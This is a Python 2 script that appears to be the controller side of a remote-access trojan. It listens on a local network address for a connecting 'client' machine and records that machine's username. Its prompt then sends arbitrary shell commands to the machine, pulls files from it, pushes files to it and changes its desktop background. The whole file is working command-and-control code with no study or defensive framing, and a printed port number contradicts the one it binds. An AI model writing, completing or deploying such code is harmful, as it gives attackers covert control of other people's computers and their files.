#!/usr/bin/env python
import socket 
import os      
import threading
import subprocess
import hashlib



def download(conn,command):


	x,dest,src=map(str,command.split('*'))
	conn.send(command)
	f = open(dest,'wb') 
	bits = conn.recv(1024)
	while bits!='': 
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		f.write(bits)
		bits=conn.recv(1024)
		if bits.endswith('DONE'):
			bits=bits.replace('DONE','')
			f.write(bits)
			f.close()
			break
		
	
        
    
def upload(conn,command):



	x,src,dst=map(str,command.split('*'))
	conn.send(command)
	file_to_send=open(src,'rb')
	packet=file_to_send.read(1024)
	while packet!='':
		conn.send(packet) 
		packet = file_to_send.read(1024)
	conn.send('DONE')
	file_to_send.close()
	md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
	conn.send(md5_sv)
	print md5_sv
	if conn.recv(1024)=='md5 OK':
		print '[+] md5 Verified, File Uploaded Succesfully'


def _help():
	subprocess.call('clear',shell=True)
	print 'The list of the available commands are : terminate,username,download,change_desktop_bg,browse,clear\n'
	print 'To see the manual of each command type command() ex:download() , to exit this menu type exit()\n' 
	
	while True:
		help_command=str(raw_input('Help#)'))
		if help_command=='exit()':
			break
		elif help_command=='terminate()':
			print 'terminate() ends the session'
		elif help_command=='download()':
			print 'download() downloads a file from the client machine the usage is download #source #dest'
		elif help_command=='upload()':
			print 'upload() uploads a file to the client machine the usage is upload #source #dest'
	return

def connect():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("192.168.1.9", 8081))
        s.listen(100)
        print '[+] Listening for incoming TCP connection on port 8080'
        conn,addr=s.accept()
        print '[+] We got a connection from: ', addr[0]
        username=conn.recv(1024)
        print 'username is',username
        print 'To see the lists of available commands please type help()'
        while True:   
                command=raw_input(">")		
                if 'terminate' in command:
                        conn.send('terminate')
                        conn.close() 
                        break
                elif 'download' in command: 
                        download(conn,command)
                elif 'upload' in command:
                        upload(conn,command)
                elif 'browse' in command:
                        conn.send(command)
                        pass	
                elif 'change_desktop_bg' in command:
                        conn.send(command)
                        pass
                elif 'clear' in command:
                		subprocess.call('clear',shell=True)
                		pass
                elif command=='help()':
                		_help()
                else :	
                        conn.send(command) 
                        print conn.recv(1024)
        
def main ():
	connect()
main()











